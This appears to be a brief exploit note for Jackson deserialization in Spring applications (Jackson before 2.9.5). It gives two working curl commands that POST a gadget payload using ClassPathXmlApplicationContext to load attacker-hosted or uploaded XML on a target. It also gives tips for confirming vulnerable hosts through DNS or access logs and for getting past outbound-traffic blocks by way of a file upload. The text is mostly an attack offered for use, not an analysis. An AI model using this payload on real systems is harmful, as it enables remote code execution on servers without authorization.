spring version >= 4.0
Jackson version < 2.9.5

You need to host xml content.
Theoritically this could be used to check most Jackson deserialization as long as you know which class property is vulnerable(enableDefaultTyping() or @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)).
Checking access/DNS log should be able to verify whether target is vulnerable.
If no outbound traffic is allowed, try finding a file upload function. File extension is irrelevant.

curl --header "Content-Type: application/json" --request POST --data '["org.springframework.context.support.ClassPathXmlApplicationContext","http://localhost:8080/spel.xml"]' http://192.168.1.182:8080
curl --header "Content-Type: application/json" --request POST --data '["org.springframework.context.support.ClassPathXmlApplicationContext","file:///C:/....../spel.jpg"]' http://192.168.1.182:8080